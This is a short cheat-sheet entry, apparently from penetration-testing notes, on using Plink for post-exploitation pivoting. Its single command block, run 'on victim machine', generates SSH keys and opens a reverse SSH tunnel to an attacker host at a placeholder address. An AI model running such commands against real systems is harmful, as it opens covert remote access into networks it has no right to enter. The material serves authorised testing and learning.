---
title: Plink
desc: A Windows command line version of the PuTTY SSH client.
tags: [Pivoting, PostExploitation, SSH, Windows]
alts: [SSH]
website:
render_with_liquid: false
---

## Reverse Shell Connection

```sh
# On victim machine

# Generate SSH keys
ssh-keygen
# Convert the private key for Windows
puttygen private_key -o private_key.ppk

# Run reverse connection
cmd.exe /c echo y | .\plink.exe -R <attack-port>:<victim-ip>:<victim-port> attacker@<attack-ip> -i private_key.ppk -N
```